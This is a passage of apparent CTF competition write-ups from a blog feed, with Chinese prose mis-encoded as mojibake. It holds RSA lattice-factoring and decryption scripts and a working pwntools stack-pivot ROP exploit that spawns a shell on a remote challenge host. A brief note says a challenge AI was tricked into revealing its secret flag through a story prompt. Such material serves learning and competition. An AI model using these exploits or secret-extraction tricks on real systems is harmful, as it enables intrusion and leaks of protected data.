16581432595661532600201978812720360650490725084571756108685801024225869509874266586101665454995626158761371202939602347462284734479523136008114543823450831433459621095011515966186441038409512845483898182330730, 23279853842002415904374433039119754653403309015190065311714877060259027498282160545851169991611095505190810819508498176947439317796919177899445232931519714386295909988604042659419915482267542524373950892662544, 16542280976863346138933938786694562410542429842169310231909671810291444369775133082891329676227328401108505520149711555594236523078258701726652736438397249153484528439336008442771240980575141952222517324476607, 17054798687400834881313828738161453727952686763495185341649729764826734928113560289710721893874591843482763545781022050238655346441049269145400183941816006501187555169759754496609909352066732267489240733143973, 22115728663051324710538517987151446287208882441569930705944807337542411196476967586630373946539021184108542887796299661200933395031919501574357288914028686562763621166172668808524981253976089963176915686295217, 19324745002425971121820837859939938858204545496254632010818159347041222757835937867307372949986924646040179923481350854019113237172710522847771842257888083088958980783122775860443475680302294211764812636993025, 17269103712436870749511150569030640471982622900104490728908671745662264368118790999669887094371008536628103283985205839448583011077421205589315164079023370873380480423797655480624151812894997816254147210406492, 17365467616785968410717969747207581822018195905573214322728668902230086291926193228235744513285718494565736538060677324971757810325341657627830082292794517994668597521842723473167615388674219621483061095351780, 20823988964903136690545608569993429386847299285019716840662662829134516039366335014168034963190410379384987535117127797097185441870894097973310130525700344822429616024795354496158261293140438037100429185280939, 19068742071797863698141529586788871165176403351706021832743114499444358327620104563127248492878047796963678668578417711317317649158855864613197342671267006688211460724339403654215571839421451060657330746917459, 20089639597210347757891251257684515181178224404350699015820324544431016085980542703447257134320668961280907495580251880177990935443438799776252979843969984270461013888122703933975001704404129130156833542263882, 22344734326131457204500487243249860924828673944521980798994250859372628295695660076289343998351448667548250129358262592043131205967592613289260998148991388190917863322690137458448696392344738292233285437662495, 22688858027824961235755458925538246922604928658660170686458395195714455094516952026243659139809095639584746977271909644938258445835519951859659822660413616465736923822988993362023001205350387354001389518742538, 21286046487289796335501643195437352334100195831127922478044197411293510360710188581314023052580692810484251118253550837525637065385439859631494533102244585493243972819369812352385425700028640641292410326514111, 21542729548465815605357067072323013570796657575603676418485975214641398139843537820643982914302122976789859817102498484496409546012119998359943274203338400776158986205776474024356567247508744784200354385060666, 22319592382753357951626314613193901130171847776829835028715915533809475362288873045184870972146269975570664009921662023590318988850871708674240304838922536028975978222603171333743353770676344328056539379240160, 25195209191944761648246874631038407055240893204894145709996399690807569652160721616011712739214434932639646688187304865397816188999592774874989401871300784534538762135830014255425391132306536883804201055992313, 18257804244956449160916107602212089869395886846990320452133193087611626919926796845263727422042179229606817439442521540784268169177331707314788427670112999551683927934427716554137597798283300120796277229509678, 20293403064916574136692432190836928681820834973375054705153628740577159076332283715581047503287766236543327123639746352358718218140738999496451259789097826888955418315455420948960832865750253988992454128969953, 15967654820584966012628708475666706277218484919923639492431538068059543232562431059752700377242326527417238151501168940191488179144049286512652111172149113549072003881460743035279388672984805823560897688895124, 25144187979876039024245879200325843092774389926620026124061775431569974232758799200333888039013494603721065709195353330350750055309315207499741437181094874894647736904055829877859906318073991986020178158776286, 15736932921640444103019961538951409924080453868073105830403926861058056351553271238438325117113945341892868641345117717666354739204401152657265824568724844930574396801692131746182948347887298330990039956813130, 18831072673439732764722762485733622234889447953507582396819704359771208236721692820362137219509611319088756045211407777880521726782697895768017460064889670066178710804124631128581556314122255564861269062385337, 23800437561684813552661749774840752013501533683948618798811470214669024646396165487093720960221009038817909066075238937189371227098032581450466402462014437421254375846263830927945343485988463525070074913720710, 24402191070622494792723290726249952159888270689258801831518209605331984684494095167423722682814769395395011136124403802097229547003802312444913008194461779426175966774202219703164060353710247619639616444797670, 20215481513831963554421686543560596857659844027486522940060791775984622049024173363533378455076109165728144576719015392033536498353094895564917644840994662704362121549525329105205514332808950206092190939931448, 18384453917605955747212560280232547481041600196031285084598132475801990710125754705645482436436531608696373462641765399622296314590071558616193035939108523357020287896879479452040171765916716377102454266933226, 21890401344164908103930010123434944359446535642544335610455613014563290097498740447164765588532234051104173227090428486681237432196639010849051113283297943367655458678533223039415083212229970648958070799280218, 18379893441293694747570620009241814202936873442370354246029979042247705730610190888710981918183390028386451290137755339890329474403224043675724851314770861939082447728194632548864823398818221526652331319263027, 18715827130228986951360013590464775001019026913384718876134449689773600060962392738619405370033085704046027397895627933844824630723286144367800484157574548819065406118338665931032779491897783504790669824301288, 13588739911708699123450670852772302012518315143187739886523841133752009403411431627334135210166268158490674049617489193734568451811305631563767138879895461211915128972052001136464325219117009268526575020143259, 18506039912943821193373920483847347155611306173368341979655092778147169768984477236224526786441466933360500418090210912574990962709452725122792963919616633389125605160796446674502416801964271004625701238202575, 22167985517547342184812919437069844889650448522260359154086923601900060998572245598167213217022051141570075284051615276464952346620430587694188548679895095556459804921016744713098882496174497693878187665372865, 21507363933875318987283059841465034113263466805329282129011688531718330888226928182985538861888698160675575993935166249701145994333840516459683763957425287811252135418288516497258724668090570720893589001392220, 20250321586608105267884665929443511322540360475552916143405651419034772061789298150974629817817611591100450468070842373341756704300393352252725859102426665187194754280129749402796746118608937061141768301995522, 16104259151024766025645778755951638093681273234415510444173981198301666343334808614748361662637508091511498829253677167171091582942780017355912433497214576425697459483727777273045993446283721290714044600814203, 14560242181138184594433372530956542527312169507277535425067427080573272033961044062335960097446781943943464713852520415535775461964590009720592053626735276833191667395201287169782350381649400286337671320581068, 16239347596615402699390026749150381714807445218767496868569282767673828662340774349530405347667558555781433774705139593469838946201218537641296949822639509296966092138954685186059819628696340121356660166937131, 21344472317634795288252811327141546596291633424850284492351783921599290478005814133560171828086405152298309169077585647189366292823613547973428250604674234857289341613448177246451956695700417432794886277704716, 16053809990112020217624905718566971288375815646771826941011489252522755953750669513046736360397030033178139614200701025268874379439106827823605937814395162011464610496629969260310816473733828751702925621950679, 18917855883623050190154989683327838135081813638430345099892537186954876489710857473326920009412778140451855952622686635694323466827034373114657023892484639238914593012175120540210780102536003758794571846502397, 22690171278715056779052233972642657173540399024770527983659216197108042021644328773010698851143953503599329885607621773816718008861742027388432534850163666629476315340137626681994316866368449548292328156728206, 21087818524872480052313215092436868441694786060866149491087132591272640372512484925209820065536439188250579925233059144898601140234767300574307770064543499923712729705795392684173268461519802573563186764326797, 18439753470094841291394543396785250736332596497190578058698960152415339036714664835925822942784700917586270640813663002161425694392259981974491535370706560550540525510875465091384383255081297963169390777475352, 20105719699015744146039374208926740159952318391171137544887868739518535254000803811729763681262304539724253518465850883904308979964535242371235415049403280585133993732946919550180260852767289669076362115454200, 17251599484976651171587511011045311555402088003441531674726612079301412643514474016351608797610153172169183504289799345382527665445027976807805594288914226822374523878290416047130731166794970645275146679838899, 23027331991437585896233907022469624030630702237261170259290872847355304456043379238362120518409085840638396736666056992747627271193089116095167049248270541979716594671069985183070290375121270398623215587207529, 18158149685496169798299129683009221264185608469410295069411669832919646968324946121757411511373498747604679198739125835462814352243797919744572086307939585501566092705355693015625009717017077302201663788208609, 18276153196656501517216055049560959047263892309902154534799806637704337317207294332426798932144785240877892837491213916540255237702169595754963908689566362060228840286531616263506272071630209104758589482803348, 19830654702835464289082520892939657653574451119898587213320188332842291005863699764597454403874285715252681820027919359194554863299385911740908952649966617784376852963552276558475217168696695867402522508290055, 15349828226638644963106414986240676364822261975534684137183044733508521003843559094515387144949811552173241406076270015291925943459603622043168219534080772937297911323165839870364550841685270125556125756627553, 20923687596111161976478930953796496927811701530608223491138786355445002217973253897724452954815797952200740069102515860924306246841340715110620719064010080520601890251137419840158983682372232110885549732743013, 21095748006022412831703352650023882351218414866517568822818298949510471554885207645049385966827210564667371665855668707424105040599599901165292360321667007968065708796593851653085339928947755081203265281357013, 20136320433636422315432754195821125224777716034031656342233368000257459497472596860252592531939146543685406198978058242599116859263546329669263543660114747385041549283367183026001454445297981439938401547228229, 16496919752274418275948572022974868132658743151124597724312835413857298109100258912203517423633396955060591787380445877361136405137884456764770035346437177846666365911942996404514058688909577420388537479730705, 13788728438272498164727737074811797093818033799836159894472736480763530670013682288670889124484670336660448907074673625466218166413315342420667608074179975422284472184048790475129281850298519112884101776426380, 24852871485448795332267345793743281093931161235481251209948049584749441451621572752080662697610253315331335180611651946374137068256112152253681972406000252076016099200912670370417045090034045383991812756120791, 18663346319122078996775762643035864683521213720864038756854558668694021987970601131985163948257100423991091156649638455828855082098689641225427227191064496066436196910238564311309556938903101074363279783438714, 21400068681031931459396470039651524575262457489792894764406364952394476440804779651233022862527636114968325782197380721095406628084183336358459476006267416033892771932528688312375109463803215034905281657962293, 16044158155847172030103761204572942507195578382208455423846603003318483484698088948486132040995746837257705704187725306831142305215342467016564452582165866039427184607605673304595194959499145031211096109534167, 16518253246325822837502418827700493807621067058438396395472266350036385535241769917459657069911028720968654253735107131282350340465691670072304718987805883113410923109703284511709226857412404454224134480632696, 22032469066601123287586507039704080058983969235246539501189720236880312024198451198788699002335010120658564926677243708367430773661097221076615953342733896063909953602379936312639192315223258556134958059637605, 17474611942177808070315948910226643697957069578572244709354155010512694059987765040746148981545760660371360975936526076852619987733316042847813177383519241505024635332293992920023420060610648140841369822739716, 20097265939024591617239874622716452182434300498447992668997438018575636772416262543204370899462096267444545094719202447520254303983442269757551626971917981420832391886214473318353984504467919530676605744560570, 18170251482705061226968041449812078923477452841162650888922564215790088545936753453513162197661916172215859504545409274440450807677845894292177296835154674774694992388033874349807244020099167681146357128785394, 18084007437523118129421476751918491055914528331902780911288404344016551650138679157754567938593688369062981279371320169939281882307797009116458871503759873023914718337944953764426183937635379280572434676575757, 17001811604221128900675671565539617923973183364469396458234914432162200119518252971721448274846235879320362924206656971472493711107677598961463553324277826426691784458674010708635756004550789902368338633272118, 20217009574515126619724139485885721324936960849401637840860565569588595992087537454744066905387396266844236387315004915383456736142307523960394594650088663019228826091309049211780607761862663242437656610298243, 25534440916970201550118006203706860249111087748000550226680885431006136131742280963090650607632467666558508520152535105122661615376298673454198064361094319699307084117001019115669670029195171047304283891069792, 18871869316294018605789169171879572816494092699556970507058691345095743053290043643010965660058888064972257990750611470141816041727746767146945121588515830427165739580791663951175220638901672353681640741068573, 20173968537913641339915058056878181363456579537994317562789857397928196160113042659777558550242315788417022891612723148843142958668959046890197219991727894451795438138592005695329607326086644956073759609743066, 20601943394990265144021144365970164017319737300436518536503270346147112565303361487668388700369636611354280332841812324530501569200031186584749278453651172121161814207025650519637781007286435981682228528706305, 16397528630087028144645213166977866073543422560337716097539091258081008408890966764995645782823950721804205427713461441138000880478364026137452291234097219085473748076681729365744710225699866258812642458184750, 21373350333568141000876969785296802670776508778278005158047105058430550665787088265486222905402690421155861103648370249249790560185790723042867282734693553039477436055775198037042047438047898227097749354619822, 17767469767416052322357795736899648760868316512079849340028040817353808899589201201338152114229279980849491049574543361275046276135253417685681262008211582060955974064559129311524323185960856955462761555353091, 22148352529815091269441663541923247974004854058764556809596705832663604786920964849725772666340437231503146814919702525852955831173047034475925578238466977606367380212886384487294569287202762127531620290162734, 21663842528026621741414050256553652815372885707031383713657826718944735177083300302064509342116651731671570591336596953911570477161536730982887182434407761036442993588590230296643001682944654490645815177777455, 20219077358929317461660881724990436334639078047412693497584358963241840513748365548465302817975329987854784305275832045889690022909383530837382543579292451297269623663257098458645056099201050578472103957851128, 18255302182526662903763852563401346841065939531070045000414364747445988455597258924280193695407035356029557886165605853810182770534711966292253269625917149411889979307227493949293798772727125069093642134972336, 24926064145128749429079117171467042019887257504329103038171762786986349157515552927216574990423327013202735544601170247730647598931030432792167867343343213411600516855009788294067588153504026267213013591793027, 22369607314724468760253123915374991621544992437057652340350735935680183705467064876346663859696919167243522648029531700630202188671406298533187087292461774927340821192866797400987231509211718089237481902671100, 16994227117141934754898145294760231694287000959561775153135582047697469327393472840046006353260694322888486978811557952926229613247229990658445756595259401269267528233642142950389040647504583683489067768144570, 21758885458682118428357134100118546351270408335845311063139309657532131159530485845186953650675925931634290182806173575543561250369768935902929861898597396621656214490429009706989779345367262758413050071213624, 20156282616031755826700336845313823798147854495428660743884481573484471099887576514309769978525225369254700468742981099548840277532978306665910844928986235042420698332201264764734685502001234369189521332392642, 23291765247744127414491614915358658114280269483384022733002965612273627987872443453777028006606037159079637857473229879140366385523633075816362547967658930666106914269093225208138749470566410361196451552322613, 19807792217079652175713365065361659318870738952921195173619551645956745050506271953949139230097128034416815169649874760890189515620232505703162831090225715453502422905418824316957257395992121750661389503495033, 22074209373194902539215367382758486068533032275912313703269990627206774967653336496619231924013216321042649461711292555464574124714934511202231319963361912937842068483700298097209400217869036338644607607557860, 19678336511265998427322297909733474384702243426420286924671444552444079816707773485084891630780465895504253899943221044355971296122774264925882685351095921532685536165514189427245840338009573352081361238596378, 24746314790210393213546150322117518542380438001687269872679602687597595933350510598742749840102841364627647151669428936678130556027300886850086220074563664367409218038338623691372433831784916816798993162471163, 19346137206512895254202370018555139713690272833895195472766704715282164091959131850520571672509601848193468792313437642997923790118115476212663296111963644011010744006086847599108492279986468255445160241848708, 22739514514055088545643169404630736699361136323546717268615404574809011342622362833245601099992039789664042350284789853188040159950619203242924511038681127008964592137006103547262538912024671048254652547084347, 21491512279698208400974501713300096639215882495977078132548631606796810881149011161903684894826752520167909538856354238104288201344211604223297924253960199754326239113862002469224042442018978623149685130901455, 19381008151938129775129563507607725859173925946797075261437001349051037306091047611533900186593946739906685481456985573476863123716331923469386565432105662324849798182175616351721533048174745501978394238803081, 19965143096260141101824772370858657624912960190922708879345774507598595008331705725441057080530773097285721556537121282837594544143441953208783728710383586054502176671726097169651121269564738513585870857829805]</span><br><span class="line"></span><br><span class="line">k = 2^(512 - 180)</span><br><span class="line"></span><br><span class="line">M = Matrix.column([k * v for v in V]).augment(Matrix.identity(len(V)))</span><br><span class="line">B = [b[1:] for b in M.LLL()]</span><br><span class="line">M = (k * Matrix(B[:len(V)-2])).T.augment(Matrix.identity(len(V)))</span><br><span class="line">B = [b[-len(V):] for b in M.LLL() if set(b[:len(V)-2]) == &#123;0&#125;]</span><br><span class="line"></span><br><span class="line">for s, t in itertools.product(range(100), repeat=2):</span><br><span class="line">    T = s*B[0] + t*B[1]</span><br><span class="line">    a1, a2, a3 = T[0], T[1], T[2]</span><br><span class="line">    kq = gcd(a1 * hints[1] - a2 * hints[0], n)</span><br><span class="line">    if 1 &lt; kq &lt; n:</span><br><span class="line">        print(&#x27;find!&#x27;, kq, s, t)</span><br><span class="line">        break</span><br><span class="line">for i in range(2**16, 1, -1):</span><br><span class="line">    if kq % i == 0:</span><br><span class="line">        kq //= i</span><br><span class="line">q = int(kq)</span><br><span class="line">p = int(n // kq)</span><br><span class="line">print(&#x27;p&#x27;, p)</span><br><span class="line">print(&#x27;q&#x27;,q)</span><br><span class="line">#8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549 0 1</span><br><span class="line">9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class="line">8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼Œpï¼Œq ç›´æ¥è§£å‡ºç¬¬äºŒéƒ¨åˆ†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">from gmpy2 import gmpy2</span><br><span class="line"># kq, s, t = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549 0 1</span><br><span class="line">p = 9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class="line">q = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br><span class="line">n, e = (73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)</span><br><span class="line">c2 = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(65537, (p-1)*(q-1))</span><br><span class="line">m = pow(c2,d,n)</span><br><span class="line">flag2 = long_to_bytes(m)</span><br><span class="line">print(q*p)</span><br><span class="line">print(flag2)</span><br><span class="line"># b&#x27;s0lve_the_@pb&#x27;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰éƒ¨åˆ†ï¼š</p><p>å‘ç°è¿™é‡Œå¯ä»¥ç›´æ¥ç”¨ç¬¬äºŒéƒ¨åˆ†çš„ pï¼Œ q</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">from gmpy2 import gmpy2</span><br><span class="line"># # kq, s, t = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549 0 1</span><br><span class="line">p = 9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class="line">q = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br><span class="line">n, e = (73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)</span><br><span class="line">c2 = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(65537, (p-1)*(q-1))</span><br><span class="line">m = pow(c2,d,n)</span><br><span class="line">flag2 = long_to_bytes(m)</span><br><span class="line">print(q*p)</span><br><span class="line">print(flag2)</span><br><span class="line"># b&#x27;s0lve_the_@pb&#x27;</span><br><span class="line"></span><br><span class="line">p = 9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class="line">q = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br><span class="line">c3 = 17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755</span><br><span class="line"></span><br><span class="line">n3,e3 = (94789409892878223843496496113047481402435455468813255092840207010463661854593919772268992045955100688692872116996741724352837555794276141314552518390800907711192442516993891316013640874154318671978150702691578926912235318405120588096104222702992868492960182477857526176600665556671704106974346372234964363581, 65537)</span><br><span class="line">c3 = 17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755</span><br><span class="line">m3 = pow(c3,d,n)</span><br><span class="line">flag3= long_to_bytes(m3)</span><br><span class="line">print(flag3)</span><br><span class="line"># b&#x27;q_prob1em!!&#125;&#x27;</span><br></pre></td></tr></table></figure><h1 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> Miscï¼š</h1><h2 id="givemesecret"><a class="markdownIt-Anchor" href="#givemesecret">#</a> givemesecretï¼š</h2><p>â€‹ai é¢˜ï¼Œè™½ç„¶ä¸æ‡‚åŸç†ï¼Œä½†é˜Ÿå‹å‡ºäº†ï¼Œä»–çš„æ–¹æ³•æ˜¯å…ˆè®© ai ç¼–ä¸€ä¸ªæ•…äº‹ï¼Œæ˜¯å¦å’Œ flag æœ‰å…³æˆ‘æ²¡é—®ä»–ï¼Œä¹‹åè®© ai æ˜¾ç¤º flag å³å¯</p><p><img data-src="https://i-blog.csdnimg.cn/direct/2188fc8e167d4abc8b142f462c81ff30.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="master-of-osint"><a class="markdownIt-Anchor" href="#master-of-osint">#</a> Master of OSINTï¼š</h2><p>1. è¿œå¤„æœ‰æµ·ï¼Œæœ‰å±±ï¼Œæœ‰è‰ï¼Œç©ºæ—·ï¼ŒåŒ—æ–¹ï¼Œç¯æµ·æˆ–è€…ç¯æ¹–å…¬è·¯ï¼Œé’æµ·æ¹–ï¼Œæ ¹æ®ä½ç½®å»æ‰¾</p><p>2. ç™¾å®‰å±…å»æ‰¾</p><p>3. å››å·çœæœºåœºé›†å›¢èˆªç©ºåœ°é¢æœåŠ¡æœ‰é™å…¬å¸</p><p>4.IKEA å®œå®¶å®¶å±…é™„è¿‘</p><p>5. é‡åº†</p><p>6.H å½¢å¤§å¦</p><p><img data-src="https://i-blog.csdnimg.cn/direct/a7a84a502b8243e7b5064e67ea497ef4.jpeg#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>7. å·¦ä¾§æ˜¯èˆ¹ï¼Œå³ä¾§è§‰åå¡”ï¼Œæ©˜å­æ´²æ¸¸å®¢ä¸­å¿ƒä½ç½®</p><p>8. ä¸€ä¸ªè·¨æµ·å¤§æ¡¥ï¼Œå³ä¾§è½¦é“ â€œé•¿æ±Ÿâ€</p><p>9. æ­¦æ±‰å¤©å…´æ´²é•¿æ±Ÿå¤§æ¡¥ä¸­é—´</p><p><img data-src="https://i-blog.csdnimg.cn/direct/a7aeeaf030df4557ae759a32c4def541.jpeg#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>10. å®æ³°ç™¾è´§ï¼Œç„¶åæ­å·å’Œæ·±åœ³éƒ½è¯•è¯•ï¼Œç¡®å®šä¸ºæ­å·</p><h2 id="ç­¾åˆ°"><a class="markdownIt-Anchor" href="#ç­¾åˆ°">#</a> ç­¾åˆ°ï¼š</h2><p>â€‹flag å†å†…å®¹é‡Œï¼Œç›´æ¥äº¤ã€‚</p><h2 id="é—®å·è°ƒæŸ¥"><a class="markdownIt-Anchor" href="#é—®å·è°ƒæŸ¥">#</a> é—®å·è°ƒæŸ¥ï¼š</h2><p>â€‹å¡«å†™é—®å·å°±æœ‰ flagã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#web&quot;&gt;#&lt;/a&gt; webï¼š&lt;/h1&gt;
&lt;h2 id=&quot;pyblockly&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pyblockly&quot;&gt;#&lt;/a</summary>
      
    
    
    
    <category term="CTFerçš„æ¯”èµ›ä¹‹è·¯" scheme="http://blog.g01den.top/categories/Game/"/>
    
    
    <category term="Game" scheme="http://blog.g01den.top/tags/Game/"/>
    
  </entry>
  
  <entry>
    <title>ç½‘é¼æ¯2024é’é¾™ç»„å®˜æ–¹èµ„æ ¼èµ›wp</title>
    <link href="http://blog.g01den.top/posts/c2860616.html"/>
    <id>http://blog.g01den.top/posts/c2860616.html</id>
    <published>2024-10-31T11:24:37.000Z</published>
    <updated>2024-10-31T11:30:25.281Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn02"><a class="markdownIt-Anchor" href="#pwn02">#</a> pwn02:</h1><p>** ç¬¬ä¸€æ­¥ï¼š**checksec å‘ç° 32 ä½æ¶æ„ï¼Œå¼€äº† NX å’Œ ASLRã€‚</p><p><img data-src="https://i-blog.csdnimg.cn/direct/e15f7f729e9047e280f849d9038d0ef1.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>** ç¬¬äºŒæ­¥ï¼š**login å‡½æ•°æœ‰ä¸ªç™»é™†ï¼Œè´¦å·å¯†ç éƒ½åœ¨é‡Œé¢</p><p><img data-src="https://i-blog.csdnimg.cn/direct/aceb7788569e4b7eba0de8d9a96b1d89.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>** ç¬¬ä¸‰æ­¥ï¼š**vuln å‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºï¼Œä½†æ˜¯åªèƒ½æº¢å‡º 8 ä¸ªå­—èŠ‚ï¼Œç¡®å®šä½æ ˆè¿ç§»ã€‚</p><p><img data-src="https://i-blog.csdnimg.cn/direct/0017c348f35141c0b98d0ca1a3382fce.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>** ç¬¬å››æ­¥ï¼š** ç¼–å†™è„šæœ¬ï¼Œæ”»å‡»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./short&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./short&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;0192d5e6064e782f81f9a9fbc9fc041d.0ke5.dg05.ciihw.cn&quot;</span>,<span class="number">45818</span>)</span><br><span class="line"><span class="comment"># io.recvuntil(b&quot;Enter your username: &quot;)</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"><span class="comment"># io.recvuntil(b&quot;Enter your password: &quot;)</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;admin123&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;You will input this: &quot;</span>)</span><br><span class="line">add = io.recv(<span class="number">10</span>) </span><br><span class="line"><span class="comment"># print(int(add,16))</span></span><br><span class="line">addr = <span class="built_in">int</span>(add,<span class="number">16</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x080483fa</span></span><br><span class="line">system_addr = elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = <span class="number">0x804A038</span></span><br><span class="line">vuln_addr = elf.symbols[<span class="string">&quot;vuln&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = p32(ret) + p32(system_addr) + p32(ret) + p32(binsh) + p32(binsh)</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>,<span class="string">b&quot;p&quot;</span>) </span><br><span class="line">payload = payload + p32(addr) + p32(<span class="number">0x08048674</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img data-src="https://i-blog.csdnimg.cn/direct/81c4aa9d525f4c158218615d13caf5ce.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="misc03"><a class="markdownIt-Anchor" href="#misc03">#</a> misc03ï¼š</h1><p>** ç¬¬ä¸€æ­¥ï¼š** æ‰“å¼€æµé‡åŒ…ï¼Œæ ¹æ®åè®®æ’åºå‘ç°äº†ä¸¤ç§æœ‰ç”¨çš„åè®®ï¼Œä¸€ä¸ª TCPï¼Œä¸€ä¸ª HTTPï¼Œå¯Ÿè§‰å¯èƒ½æ˜¯ä¸ªç½‘ç«™ï¼Œç„¶åè¿‡æ»¤ HTTPï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/935450027d77434ea760ad654e2da17a.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>** ç¬¬äºŒæ­¥ï¼š** è¿‡æ»¤ HTTP åå‘ç°äº†ä¸ªç–‘ä¼¼å±é™© ipï¼š39.144.218.183ï¼Œæœ‰çˆ†ç ´ç›®å½•çš„å¯èƒ½ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/524d347f90dd4aa4a123c2b543563c9c.png#pic_center" 